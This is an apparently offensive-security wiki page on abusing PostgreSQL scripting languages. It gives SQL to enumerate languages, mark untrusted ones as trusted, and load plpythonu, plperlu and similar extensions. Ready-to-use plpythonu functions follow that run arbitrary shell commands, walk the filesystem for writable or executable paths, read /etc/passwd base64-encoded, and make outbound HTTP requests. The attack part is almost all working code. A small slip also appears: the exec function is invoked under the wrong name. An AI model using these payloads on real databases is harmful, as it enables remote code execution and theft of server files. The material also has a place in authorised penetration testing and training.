---
layout: page
title: PostgreSQL Languages
description:
category: postgresql
toc:
  sidebar: left
---

## PostgreSQL Languages

The PostgreSQL database you got access to may have different **scripting languages installed** that you could abuse to **execute arbitrary code**.

You can **get them running**:

```sql
\dL *

SELECT lanname,lanpltrusted,lanacl FROM pg_language;
```

Most of the scripting languages you can install in PostgreSQL have **2 flavours**: the **trusted** and the **untrusted**. The **untrusted** will have a name **ended in "u"** and will be the version that will allow you to **execute code** and use other interesting functions. This are languages that if installed are interesting:

- **plpythonu**
- **plpython3u**
- **plperlu**
- **pljavaU**
- **plrubyu**
- ... (any other programming language using an insecure version)

> [!WARNING]
> If you find that an interesting language is **installed** but **untrusted** by PostgreSQL (**`lanpltrusted`** is **`false`**) you can try to **trust it** with the following line so no restrictions will be applied by PostgreSQL:
>
> ```sql
> UPDATE pg_language SET lanpltrusted=true WHERE lanname='plpythonu';
> # To check your permissions over the table pg_language
> SELECT * FROM information_schema.table_privileges WHERE table_name = 'pg_language';
> ```

> [!CAUTION]
> If you don't see a language, you could try to load it with (**you need to be superadmin**):
>
> ```
> CREATE EXTENSION plpythonu;
> CREATE EXTENSION plpython3u;
> CREATE EXTENSION plperlu;
> CREATE EXTENSION pljavaU;
> CREATE EXTENSION plrubyu;
> ```

Note that it's possible to compile the secure versions as "unsecure". Check [**this**](https://www.robbyonrails.com/articles/2005/08/22/installing-untrusted-pl-ruby-for-postgresql.html) for example. So it's always worth trying if you can execute code even if you only find installed the **trusted** one.

## plpythonu/plpython3u

```sql
CREATE OR REPLACE FUNCTION exec (cmd text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    return os.popen(cmd).read()
    #return os.execve(cmd, ["/usr/lib64/pgsql92/bin/psql"], {})
$$
LANGUAGE 'plpythonu';

SELECT cmd("ls"); #RCE with popen or execve
```

```sql
CREATE OR REPLACE FUNCTION get_user (pkg text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    return os.getlogin()
$$
LANGUAGE 'plpythonu';

SELECT get_user(""); #Get user, para is useless
```

```sql
CREATE OR REPLACE FUNCTION lsdir (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import json
    from os import walk
    files = next(walk(dir), (None, None, []))
    return json.dumps({"root": files[0], "dirs": files[1], "files": files[2]})[:65535]
$$
LANGUAGE 'plpythonu';

SELECT lsdir("/"); #List dir
```

```sql
CREATE OR REPLACE FUNCTION findw (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        writables = []
        def find_writable(path):
            if not os.path.isdir(path):
                return
            if os.access(path, os.W_OK):
                writables.append(path)
            if not os.listdir(path):
                return
            else:
                for item in os.listdir(path):
                    find_writable(os.path.join(path, item))
        find_writable(path)
        return writables

    return ", ".join(my_find(dir))
$$
LANGUAGE 'plpythonu';

SELECT findw("/"); #Find Writable folders from a folder (recursively)
```

```sql
CREATE OR REPLACE FUNCTION find_file (exe_sea text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path):
                executables.append(path)

            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables

    a = my_find("/")
    b = []

    for i in a:
        if exe_sea in os.path.basename(i):
            b.append(i)
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT find_file("psql"); #Find a file
```

```sql
CREATE OR REPLACE FUNCTION findx (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path) and os.access(path, os.X_OK):
                executables.append(path)

            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables

    a = my_find(dir)
    b = []

    for i in a:
        b.append(os.path.basename(i))
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT findx("/"); #Find an executables in folder (recursively)
```

```sql
CREATE OR REPLACE FUNCTION find_exe (exe_sea text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path) and os.access(path, os.X_OK):
                executables.append(path)

            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables

    a = my_find("/")
    b = []

    for i in a:
        if exe_sea in i:
            b.append(i)
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT find_exe("psql"); #Find executable by susbstring
```

```sql
CREATE OR REPLACE FUNCTION read (path text)
RETURNS VARCHAR(65535) stable
AS $$
    import base64
    encoded_string= base64.b64encode(open(path).read())
    return encoded_string.decode('utf-8')
    return open(path).read()
$$
LANGUAGE 'plpythonu';

select read('/etc/passwd'); #Read a file in b64
```

```sql
CREATE OR REPLACE FUNCTION get_perms (path text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    status = os.stat(path)
    perms = oct(status.st_mode)[-3:]
    return str(perms)
$$
LANGUAGE 'plpythonu';

select get_perms("/etc/passwd"); # Get perms of file
```

```sql
CREATE OR REPLACE FUNCTION req2 (url text)
RETURNS VARCHAR(65535) stable
AS $$
    import urllib
    r = urllib.urlopen(url)
    return r.read()
$$
LANGUAGE 'plpythonu';

SELECT req2('https://google.com'); #Request using python2

CREATE OR REPLACE FUNCTION req3 (url text)
RETURNS VARCHAR(65535) stable
AS $$
    from urllib import request
    r = request.urlopen(url)
    return r.read()
$$
LANGUAGE 'plpythonu';

SELECT req3('https://google.com'); #Request using python3
```
